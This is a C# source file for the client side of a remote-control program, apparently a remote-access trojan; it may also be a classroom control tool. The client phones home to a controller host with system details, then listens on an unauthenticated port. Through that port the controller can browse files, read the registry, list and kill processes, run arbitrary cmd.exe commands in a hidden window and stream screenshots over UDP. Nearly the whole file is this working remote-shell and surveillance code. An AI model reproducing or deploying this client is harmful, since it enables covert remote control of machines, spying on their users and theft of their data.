using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Management;  //加入WMI
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
#pragma warning disable 0168
#pragma warning disable 0618
namespace Control_Client
{
    public partial class Main_Form : Form
    {
        #region 全局变量部分

        TcpClient Client;
        TcpListener Lis;
        NetworkStream Stream;
        Socket socket;
        Socket Lis_socket;
        String LocalDisk_List     = "$GetDir||";                     //电脑盘符命令，初始化命令头
        String Online_Order       = "$Online||";                     //上线命令，初始化命令头部
        String Folder_List        = "$GetFolder||";                  //列举子文件夹命令，初始化命令头
        String File_List          = "$GetFile||";                    //列举文件命令，初始化命令头
        String Process_List       = "$GetProcess||";                 //列举文件命令，初始化命令头
        String RegName_List       = "$GetRegisterRoot||";            //列举注册表子项名命令，初始化命令头
        String RegNameValues_List = "$GetRegisterRootValues||";      //列举注册表子项值命令，初始化命令头
        String CMD_List           = "$ActiveDos||";                  //保存DOS命令执行后的结果
        String Service_List       = "$GetService||";                 //保存系统服务列表
        Process CMD = new Process();                                 //用于执行DOS命令
        bool _IsStop_Catching_Desktop = false;                       //此标识为用于判断是否停止对于屏幕的获取
        UdpClient UDP_Client = new UdpClient();
        public delegate void Pt();

        #endregion

        #region 构造函数部分

        public Main_Form()
        {
            InitializeComponent();
        }

        #endregion

        #region  窗体加载动作

        /// <summary>
        /// 窗体加载时默认连接主控端主机
        /// 如果连接成功则发送上线请求
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Main_Form_Load(object sender, EventArgs e)
        {
            Online_Order += Globle.Software + "||";
            //调用WMI收集系统信息
            this.Get_ComputerInfo();
            //发送上线请求 - [多线程]
            Thread thread = new Thread(new ThreadStart(this.Post_Online_Message));
            thread.Start();
            //自身监听端口 - [多线程]
            Lis = new TcpListener(Globle.Lis_Port);
            Lis.Start();  //一直监听
            Thread thread_Lis_MySelf = new Thread(new ThreadStart(this.Listen_Port));
            thread_Lis_MySelf.Start();
        }

        #endregion

        #region 创建子窗口
        private void CreateWindow()
        {
            teach TH = new teach();
            TH.Show();
        }
        #endregion

        #region 被控端上线相关操作

        /// <summary>
        /// 此方法用于向主控端发送上线请求 
        /// 命令原型 : $Online||软件版本||计算机名||客户注释||操作系统||CPU频率||内存容量
        /// </summary>
        public void Post_Online_Message()
        {
            this.Client = new TcpClient();
            //尝试连接
            bool _IsConnected = false;

            while (_IsConnected == false)
            {
                try
                {
                    this.Client.Connect(Globle.Host, Globle.Port);
                    //如果连接上了
                    if (this.Client.Connected)
                    {
                        _IsConnected = true;
                        //得到套接字原型
                        this.socket = this.Client.Client;
                        this.Stream = new NetworkStream(this.socket);
                        //发送上线请求
                        this.Stream.Write(Encoding.Default.GetBytes(this.Online_Order), 0, Encoding.Default.GetBytes(this.Online_Order).Length);
                        this.Stream.Flush();
                        //如果请求发出后套接字仍然处于连接状态
                        //则单劈出一个线程，用于接收命令
                        //if (this.socket.Connected)
                        //{
                        //    Thread thread = new Thread(new ThreadStart(this.Get_Server_Order));
                        //    thread.Start();
                        //}
                        _IsConnected = true;
                    }
                }
                catch (Exception)
                {
                    System.Threading.Thread.Sleep(10000);
                }
            }
        }

        /// <summary>
        /// 此方法通过Windows WMI 服务
        /// 进行计算机硬件软件信息的收集
        /// </summary>
        public void Get_ComputerInfo()
        {
            //查询计算机名
            this.Online_Order += this.WMI_Searcher("SELECT * FROM Win32_ComputerSystem", "Caption") + "||";
            //查询备注
            this.Online_Order += Globle.Customer + "||";
            //查询操作系统
            this.Online_Order += this.WMI_Searcher("SELECT * FROM Win32_OperatingSystem", "Caption") + "||";
            //查询CPU
            this.Online_Order += this.WMI_Searcher("SELECT * FROM Win32_Processor", "Caption") + "||";
            //查询内存容量 - 单位: MB
            this.Online_Order += (int.Parse(this.WMI_Searcher("SELECT * FROM Win32_OperatingSystem", "TotalVisibleMemorySize")) / 1024) + " MB||";
        }

        #endregion

        #region WMI 操作相关及扩展

        /// <summary>
        /// 此方法根据指定语句通过WMI查询用户指定内容
        /// 并且返回
        /// </summary>
        /// <param name="QueryString"></param>
        /// <param name="Item_Name"></param>
        /// <returns></returns>
        public String WMI_Searcher(String QueryString , String Item_Name)
        {
            String Result = "";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                Result = MOB[Item_Name].ToString();
                break;
            }
            MOC.Dispose();
            MOS.Dispose();
            return Result;
        }

        /// <summary>
        /// 此方法根据指定语句通过WMI查询用户指定内容
        /// 并且返回
        /// </summary>
        /// <param name="QueryString"></param>
        /// <param name="Item_Name"></param>
        /// <returns></returns>
        public String WMI_Searcher_Service_Ex(String QueryString)
        {
            String Result = "";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                try
                {
                    Result += MOB["Caption"].ToString() + ",";
                    if (MOB["Started"].ToString() == "True")
                    {
                        Result += "启动中" + ",";
                    }
                    else
                    {
                        Result += "停止中" + ",";
                    }

                    Result += MOB["Description"].ToString() + "||";
                }
                catch (Exception ex)
                { };
            }
            MOC.Dispose();
            MOS.Dispose();
            return Result;
        }

        #endregion

        #region 命令处理函数

        /// <summary>
        /// 此方法用于判断命令结构
        /// 根据不同的命令调用不同的方法进行处理
        /// </summary>
        /// <param name="Order_Set"></param>
        public void Order_Catcher(String[] Order_Set)
        {
            switch (Order_Set[0])
            {
                case "$Teach":
                    {
                        this.BeginInvoke(new Pt(this.CreateWindow));
                        break;
                    }
                //case "$Isconnected":
                //    {
                //        try
                //        {
                //            using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                //            {
                //                Ns.Write(Encoding.Default.GetBytes("$Isconnected||YES"), 0, Encoding.Default.GetBytes("$Isconnected||YES").Length);
                //                Ns.Flush();
                //            }
                //        }
                //        catch (Exception ex)
                //        {
                //            MessageBox.Show("返回保持连接信息失败");
                //        }
                //        break;
                //    }
                //此命令头表示客户端状态结果返回
                case "$Return":
                    switch (Order_Set[1])
                    {
                        //如果是上线成功
                        case "#Online_OK":
                            this.Online_OK();
                            break;
                    }
                    break;
                //此命令头表示客户端请求本机所有盘符
                case "$GetDir":
                    this.Get_LocalDisk();
                    break;
                //此命令头表示客户端请求本机指定目录下的所有文件夹
                case "$GetFolder":
                    this.Get_Foloder(Order_Set[1]);
                    break;
                //此命令头表示客户端请求本机指定目录下的所有文件
                case "$GetFile":
                    this.Get_File(Order_Set[1]);
                    break;
                //此命令头表示客户端请求本机当前所有进程
                case "$GetProcess":
                    this.Get_Process();
                    break;
                //此命令头表示客户端请求杀死本机指定进程
                case "$KillProcess":
                    this.Kill_Process(Order_Set[1]);
                    break;
                //此命令头表示客户端请求列举本地注册表根目录
                case "$GetRegisterRoot":
                    this.Get_RegRoot(Order_Set[1], Order_Set[2]);
                    break;
                //此命令头表示客户端请求列举本地注册表指定项的所有值
                case "$GetRegisterRootValues":
                    this.Get_RegRootValues(Order_Set[1], Order_Set[2]);
                    break;
                //此命令头表示客户端请求激活本地DOS
                case "$ActiveDos":
                    this.ActiveDos();
                    break;
                //此命令头表示客户端请求执行本地DOS命令
                case "$ExecuteCommand":
                    this.Execute_Command(Order_Set[1]);
                    break;
                //此命令头表示客户端请求列举本机系统服务列表
                case "$GetService":
                    this.GetService();
                    break;
                //接受广播通知
                case "$RMessage":
                    MessageBox.Show(Order_Set[1],"远程广播");
                    break;
                case "$ExitHDC":
                    this.Desktop_Timer.Stop();
                    break;

                //此命令头表示客户端请求激活本机屏幕HDC
                case "$ActiveHDC":
                    try
                    {
                        if (this.Desktop_Timer.Enabled == true) break;
                        //得到进程列表后，尝试发送
                        using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                        {
                            Ns.Write(Encoding.Default.GetBytes("$ActiveHDC||True"), 0, Encoding.Default.GetBytes("$ActiveHDC||True").Length);
                            Ns.Flush();
                        }
                        this.UDP_Client.Connect(Globle.Host, Globle.UDP_Port);
                        //如果连接上了
                        if (this.UDP_Client.Client.Connected)
                        {
                            //新建线程进行发送桌面信息
                            //Thread thread = new Thread(new ThreadStart(this.Catching_Desktop));
                            //thread.Start();
                            this.BeginInvoke(new Pt(this.Active_Timer));
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("尝试发送激活HDC信息失败 : " + ex.Message);
                    }
                    break;
            }
        }


        #endregion

        #region 上线成功后操作函数

        /// <summary>
        /// 此方法用于上线成功后的用户提示
        /// </summary>
        public void Online_OK()
        {
            this.Sys_Icon.ShowBalloonTip(5000, "上线成功", "成功连接到主控端!", ToolTipIcon.Info);
        }

        #endregion

        #region  窗体关闭动作

        /// <summary>
        /// 此事件用于窗体关闭时消除所有正在运行的线程
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Main_Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            //下线命令 原型 ： $OffLine||
            String Order = "$OffLine||";
            try
            {
                //尝试发送下线请求
                this.Stream.Write(Encoding.Default.GetBytes(Order + ((IPEndPoint)this.socket.LocalEndPoint).Address.ToString()), 0, Encoding.Default.GetBytes(Order + ((IPEndPoint)this.socket.LocalEndPoint).Address.ToString()).Length);
                this.Stream.Flush();
            }
            catch (Exception ex)
            { };
            Environment.Exit(0);
        }

        #endregion

        #region 枚举硬盘 - 监听自身端口相关操作

        /// <summary>
        /// 此方法调用Windows WMI
        /// 列举当前电脑所有盘符
        /// </summary>
        public void Get_LocalDisk()
        {
            this.LocalDisk_List = "$GetDir||";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                this.LocalDisk_List += MOB["Description"].ToString() + "#" + MOB["Caption"].ToString() + ",";
            }
            MOC.Dispose();
            MOS.Dispose();

            try
            {
                //得到硬盘分区列表后，尝试发送
                using(NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    Ns.Write(Encoding.Default.GetBytes(this.LocalDisk_List), 0, Encoding.Default.GetBytes(this.LocalDisk_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发送硬盘分区列表失败 : " + ex.Message);
            }
        }

        /// <summary>
        /// 此方法用于监听上线端口
        /// </summary>
        public void Listen_Port()
        {
            while (Globle._IsListen_Port)
            {
                this.Lis_socket = Lis.AcceptSocket();  //如果有客户端请求则创建套接字
                Thread thread = new Thread(new ThreadStart(this.Res_Message));
                thread.Start();
            }
        }

        #endregion

        #region 文件夹 - 文件枚举操作

        /// <summary>
        /// 此方法用于根据指定盘符列举子文件夹
        /// </summary>
        /// <param name="Path"></param>
        public void Get_Foloder(String Path)
        {
            this.Folder_List = "$GetFolder||";
            //得到指定盘符的所有子文件夹
            String[] Folder = Directory.GetDirectories(Path);
            for (int i = 0; i < Folder.Length; i++)
			{
                this.Folder_List += Folder[i] + ",";
			}

            try
            {
                //得到文件夹列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    Ns.Write(Encoding.Default.GetBytes(this.Folder_List), 0, Encoding.Default.GetBytes(this.Folder_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发送文件夹列表失败 : " + ex.Message);
            }
        }

        /// <summary>
        /// 此方法用于根据指定盘符列举子所有文件
        /// </summary>
        /// <param name="Path"></param>
        public void Get_File(String Path)
        {
            this.File_List = "$GetFile||";
            //得到文件目标文件夹文件数组
            String[] Result_List = Directory.GetFiles(Path);
            //通过拆分得到结果字符串
            for (int i = 0; i < Result_List.Length; i++)
            {
                this.File_List += Result_List[i] + ",";
            }

            try
            {
                //得到文件列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    Ns.Write(Encoding.Default.GetBytes(this.File_List), 0, Encoding.Default.GetBytes(this.File_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发送文件夹列表失败 : " + ex.Message);
            }
        }

        #endregion

        #region 循环接收命令机制

        /// <summary>
        /// 此方法用于得到主控端发来的命令集合
        /// </summary>
        public void Get_Server_Order()
        {
            while (Globle._IsResvice_Message)
            {
                try
                {
                    byte[] bb = new byte[2048];
                    //接收命令
                    int Order_Len = this.Stream.Read(bb, 0, bb.Length);
                    //得到主控端发来的命令集合
                    String[] Order_Set = Encoding.Default.GetString(bb, 0, Order_Len).Split(new String[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
                    this.Order_Catcher(Order_Set);
                }
                catch (Exception ex)
                { };
            }
        }

        /// <summary>
        /// 此方法负责接收主控端命令
        /// 并且传递到处理方法种
        /// </summary>
        public void Res_Message()
        {
            while (Globle._IsResvice_Message)
            {
                try
                {
                    using (NetworkStream ns = new NetworkStream(this.Lis_socket))
                    {
                        try
                        {
                            byte[] bb = new byte[1024];
                            //得到命令
                            int Res_Len = ns.Read(bb, 0, bb.Length);
                            //得到完整命令分割后的数组结构
                            String[] Order_Set = Encoding.Default.GetString(bb, 0, Res_Len).Split(new String[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
                            //调用判断命令函数
                            this.Order_Catcher(Order_Set);
                        }
                        catch (Exception ex)
                        {
                            //MessageBox.Show("Error Receive2 " + ex.ToString());
                        }
                    }
                }
                catch (Exception ex)
                { };
            }
        }

        #endregion

        #region 系统进程相关操作

        /// <summary>
        /// 此方法负责列举当前系统所有进程
        /// 并且拼接结果字符串发送给主控端
        /// </summary>
        public void Get_Process()
        {
            this.Process_List = "$GetProcess||";
            Process[] process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                try
                {
                    if (process[i].ProcessName != "")
                    {
                        //拼接字符串
                        this.Process_List += process[i].ProcessName + "," + process[i].Handle.ToString() + "," + process[i].Id + "||";
                    }
                }
                catch (Exception ex)
                { };
            }
            try
            {
                //得到进程列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    Ns.Write(Encoding.Default.GetBytes(this.Process_List), 0, Encoding.Default.GetBytes(this.Process_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发送进程列表失败 : " + ex.Message);
            }
        }

        /// <summary>
        /// 此方法根据指定的进程名杀死进程
        /// 如果结束进程成功 则返回 $KillProcess||True
        /// 否则返回 $KillProcess||False
        /// </summary>
        /// <param name="Process_Name"></param>
        public void Kill_Process(String Process_Name)
        {
            bool isKilled = false;
            Process[] Process_Set = Process.GetProcesses(); 
            //遍历所有进程，找到指定进程后杀死
            for (int i = 0; i < Process_Set.Length; i++)
            {
                try
                {
                    if (Process_Set[i].ProcessName == Process_Name)
                    {
                        //如果找到进程则尝试杀死该进程
                        Process_Set[i].Kill();
                        //杀死成功后 ，改变标志位，跳出FOR循环发送回应命令
                        isKilled = true;
                        break;
                    }
                }
                catch (Exception ex)
                { };
            }

            //得到结果后判断标志位
            using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
            {
                //如果成功杀死了
                if (isKilled)
                {
                    Ns.Write(Encoding.Default.GetBytes("$KillProcess||True"), 0, Encoding.Default.GetBytes("$KillProcess||True").Length);
                    Ns.Flush();
                }
                else
                {
                    Ns.Write(Encoding.Default.GetBytes("$KillProcess||False"), 0, Encoding.Default.GetBytes("$KillProcess||False").Length);
                    Ns.Flush();
                }
            }
        }

        #endregion

        #region 注册表操作相关

        /// <summary>
        /// 此方法用于得到当前系统注册表根目录名字并且发送
        /// </summary>
        public void Get_RegRoot(String Key_Model, String Key_Path)
        {
            this.RegName_List = "$GetRegisterRoot||";
            //新建数组结构体用来接收得到的子项名集合
            String[] Reg_Name_Set = this.Get_Register_Root_Names(Key_Model, Key_Path);
            for (int i = 0; i < Reg_Name_Set.Length; i++)
            {
                //拼接结果字符串
                this.RegName_List += Reg_Name_Set[i] + "||"; 
            }
            try
            {
                //得到进程列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    Ns.Write(Encoding.Default.GetBytes(this.RegName_List), 0, Encoding.Default.GetBytes(this.RegName_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发送注册表子项列表失败 : " + ex.Message);
            }
        }

        /// <summary>
        /// 此方法根据指定的注册表项路径
        /// 查找所属下的所有子项名称
        /// 并且返回数组名称结构体
        /// </summary>
        /// <param name="Key_Model"></param>
        /// <param name="Key_Path"></param>
        /// <returns></returns>
        public String[] Get_Register_Root_Names(String Key_Model , String Key_Path)
        {
            //新建数组，用来储存子项名字集合
            String[] Names = null;
            //如果是检索根键值
            if (Key_Path == "******%None%******")
            {
                //判断键值路径所属的根键
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的
                    case "HKEY_CLASSES_ROOT":
                        Names = Registry.ClassesRoot.GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的
                    case "HKEY_CURRENT_CONFIG":
                        Names = Registry.CurrentConfig.GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_USER下面的
                    case "HKEY_CURRENT_USER":
                        Names = Registry.CurrentUser.GetSubKeyNames();
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的
                    case "HKEY_LOCAL_MACHINE":
                        Names = Registry.LocalMachine.GetSubKeyNames();
                        break;
                    //如果是HKEY_USERS下面的
                    case "HKEY_USERS":
                        Names = Registry.Users.GetSubKeyNames();
                        break;
                }
            }
            //如果是检索根键值下面的子项
            else
            {
                //判断键值路径所属的根键
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的
                    case "HKEY_CLASSES_ROOT":
                        Names = Registry.ClassesRoot.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的
                    case "HKEY_CURRENT_CONFIG":
                        Names = Registry.CurrentConfig.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_USER下面的
                    case "HKEY_CURRENT_USER":
                        Names = Registry.CurrentUser.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的
                    case "HKEY_LOCAL_MACHINE":
                        Names = Registry.LocalMachine.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_USERS下面的
                    case "HKEY_USERS":
                        Names = Registry.Users.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                }
            }
            
            //返回目录名集合
            return Names;
        }

                /// <summary>
        /// 此方法用于得到当前系统注册表根目录子项所有值并且发送
        /// </summary>
        public void Get_RegRootValues(String Key_Model, String Key_Path)
        {
            this.RegNameValues_List = "$GetRegisterRootValues||";
            //新建数组结构体用来接收得到的子项名集合
            this.RegNameValues_List += this.Get_Register_Root_Values(Key_Model, Key_Path);
            try
            {
                //得到进程列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    Ns.Write(Encoding.Default.GetBytes(this.RegNameValues_List), 0, Encoding.Default.GetBytes(this.RegNameValues_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发送注册表子项值列表失败 : " + ex.Message);
            }
        }

        /// <summary>
        /// 此方法根据指定的注册表项路径
        /// 查找所属下的所有值名称
        /// 并且返回数组名称结构体
        /// </summary>
        /// <param name="Key_Model"></param>
        /// <param name="Key_Path"></param>
        /// <returns></returns>
        public String Get_Register_Root_Values(String Key_Model, String Key_Path)
        {
            //新建数组，用来储存子项名字集合
            String Result_List ="";
            //如果是检索根键值
            if (Key_Path == "******%None%******")
            {
                //判断键值路径所属的根键
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的
                    case "HKEY_CLASSES_ROOT":
                    using(RegistryKey RK = Registry.ClassesRoot)
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                         Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的
                    case "HKEY_CURRENT_CONFIG":
                    using (RegistryKey RK = Registry.CurrentConfig)
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_CURRENT_USER下面的
                    case "HKEY_CURRENT_USER":
                    using (RegistryKey RK = Registry.CurrentUser)
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的
                    case "HKEY_LOCAL_MACHINE":
                    using (RegistryKey RK = Registry.LocalMachine)
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_USERS下面的
                    case "HKEY_USERS":
                    using (RegistryKey RK = Registry.Users)
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                }
            }
            //如果是检索根键值下面的子项
            else
            {
                //判断键值路径所属的根键
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的
                    case "HKEY_CLASSES_ROOT":
                    using (RegistryKey RK = Registry.ClassesRoot.OpenSubKey(Key_Path))
                    {
                        foreach(String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的
                    case "HKEY_CURRENT_CONFIG":
                    using (RegistryKey RK = Registry.CurrentConfig.OpenSubKey(Key_Path))
                    {
                        foreach(String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_CURRENT_USER下面的
                    case "HKEY_CURRENT_USER":
                    using (RegistryKey RK = Registry.CurrentUser.OpenSubKey(Key_Path))
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的
                    case "HKEY_LOCAL_MACHINE":
                    using (RegistryKey RK = Registry.LocalMachine.OpenSubKey(Key_Path))
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                    //如果是HKEY_USERS下面的
                    case "HKEY_USERS":
                    using (RegistryKey RK = Registry.Users.OpenSubKey(Key_Path))
                    {
                        foreach (String VName in RK.GetValueNames())
                        {
                            Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                        }
                    }
                        break;
                }
            }

            //返回目录名集合
            return Result_List;
        }

        #endregion

        #region 系统DOS相关操作

        /// <summary>
        /// 此方法用于激活本地DOS
        /// 首先查找是否存在DOS的可执行文件
        /// 如果不存在则返回错误信息
        /// 存在则返回DOS欢迎初始化信息
        /// </summary>
        public void ActiveDos()
        {
            //如果不存在文件
            if (!File.Exists("C:\\Windows\\System32\\cmd.exe"))
            {
                try
                {
                    //得到进程列表后，尝试发送
                    using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                    {
                        //DOS文件不存在命令 原型 ： $ActiveDos|| [参数1]
                        Ns.Write(Encoding.Default.GetBytes(this.CMD_List + "Error"), 0, Encoding.Default.GetBytes(this.CMD_List + "Error").Length);
                        Ns.Flush();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("尝试发不存在DOS信息失败 : " + ex.Message);
                }
            }
            //如果存在
            else
            {
                String Result = this.Get_Message_Command("");
                try
                {
                    //得到进程列表后，尝试发送
                    using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                    {
                        //DOS文件存在命令 原型 ： $ActiveDos|| 欢迎信息
                        Ns.Write(Encoding.Default.GetBytes(this.CMD_List + Result), 0, Encoding.Default.GetBytes(this.CMD_List + Result).Length);
                        Ns.Flush();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("尝试发不存在DOS信息失败 : " + ex.Message);
                }
            }
        }

        /// <summary>
        /// 此方法用于获得执行命令后的结果
        /// 并发送给主控端
        /// </summary>
        /// <param name="Order"></param>
        public void Execute_Command(String Order)
        {
            //MessageBox.Show("Client  " + Order);
            String Result = "$ExecuteCommand||" + this.Get_Message_Command(Order);
            //MessageBox.Show("Client Send" + Result);
            try
            {
                //得到进程列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    //DOS文件存在命令 原型 ： $ExecuteCommand || 命令执行结果
                    Ns.Write(Encoding.Default.GetBytes(Result), 0, Encoding.Default.GetBytes(Result).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
               // MessageBox.Show("尝试发不存在DOS执行结果失败 : " + ex.Message);
            }
        }


        /// <summary>
        /// 此方法用于将指定DOS命令执行后返回结果
        /// </summary>
        /// <param name="Command"></param>
        /// <returns></returns>
        public String Get_Message_Command(String Command)
        {
            /*
            this.CMD.StartInfo.FileName = "cmd.exe";
            this.CMD.StartInfo.Arguments = Command;
            this.CMD.StartInfo.RedirectStandardError = true;
            this.CMD.StartInfo.RedirectStandardOutput = true;
            this.CMD.StartInfo.UseShellExecute = false;
            this.CMD.StartInfo.CreateNoWindow = true;
            CMD.Start();
            String Message_Line = "";
            String Result = "";
            using(StreamReader Reader = CMD.StandardOutput)
            {
                //循环读取结果
                while((Message_Line = Reader.ReadLine()) != null)
                {
                    Result += Message_Line + "\n";
                }
            }
            //MessageBox.Show(Result,"beikong");
            return Result;
            */
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.RedirectStandardInput = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            proc.StandardInput.WriteLine(Command);
            proc.StandardInput.WriteLine("exit");
            string outStr = proc.StandardOutput.ReadToEnd();
            proc.Close();
            outStr = outStr.Substring(0, outStr.Length - 6);
            return outStr;
        }

        #endregion

        #region 系统服务相关操作

        /// <summary>
        /// 此服务用于将得到的所有系统服务列表
        /// 发送到主控端
        /// </summary>
        public void GetService()
        {
            String Result_List = this.Service_List + this.WMI_Searcher_Service_Ex("SELECT * FROM Win32_Service");
            try
            {
                //得到进程列表后，尝试发送
                using (NetworkStream Ns = new NetworkStream(this.Lis_socket))
                {
                    //DOS文件存在命令 原型 ： $ExecuteCommand || 命令执行结果
                    Ns.Write(Encoding.Default.GetBytes(Result_List), 0, Encoding.Default.GetBytes(Result_List).Length);
                    Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试发系统服务列表失败 : " + ex.Message);
            }
        }

        #endregion

        #region 远程桌面监控相关操作

        /// <summary>
        /// 此方法用于根据标志位不停的抓取屏幕图像 
        /// 并且传送给主控端
        /// </summary>
        public void Catching_Desktop()
        {
            while (!this._IsStop_Catching_Desktop)
            {
                //创建一个跟屏幕大小一样的Image
                Image img = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);
                //创建GDI+ 用来DRAW屏幕
                Graphics g = Graphics.FromImage(img);
                //将屏幕打入到Image中
                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
                //得到屏幕HDC句柄 
                IntPtr HDC = g.GetHdc();
                //截图后释放该句柄
                g.ReleaseHdc(HDC);

                MemoryStream Ms = new MemoryStream();
                //将图像打入流
                img.Save(Ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                this.Send_Desktop_Image_Info(Ms);
            }
        }

        public void Send_Desktop_Image_Info(MemoryStream Ms)
        {
            int Len = 0;
            byte[] bb = new byte[2048];
            Ms.Position = 0;
            while ((Len = Ms.Read(bb, 0, bb.Length)) > 0)
            {
                this.UDP_Client.Send(bb, Len);
                System.Threading.Thread.Sleep(1);
            }
            //发送结尾符
            this.UDP_Client.Send(Encoding.Default.GetBytes("**End**"), Encoding.Default.GetBytes("**End**").Length);
        }

        private void Desktop_Timer_Tick(object sender, EventArgs e)
        {
            if (!this._IsStop_Catching_Desktop)
            {
                //创建一个跟屏幕大小一样的Image
                Image img = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);
                //创建GDI+ 用来DRAW屏幕
                Graphics g = Graphics.FromImage(img);
                //将屏幕打入到Image中
                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
                ////得到屏幕HDC句柄 
                //IntPtr HDC = g.GetHdc();
                ////截图后释放该句柄
                //g.ReleaseHdc(HDC);
                MemoryStream Ms = new MemoryStream();
                //将图像打入流
                img.Save(Ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                this.Send_Desktop_Image_Info(Ms);
            }
        }

        /// <summary>
        /// 此方法用于将TIMER启动
        /// 调用方式 ： [委托]
        /// </summary>
        public void Active_Timer()
        {
            this.Desktop_Timer.Start();
        }

        #endregion

    }
}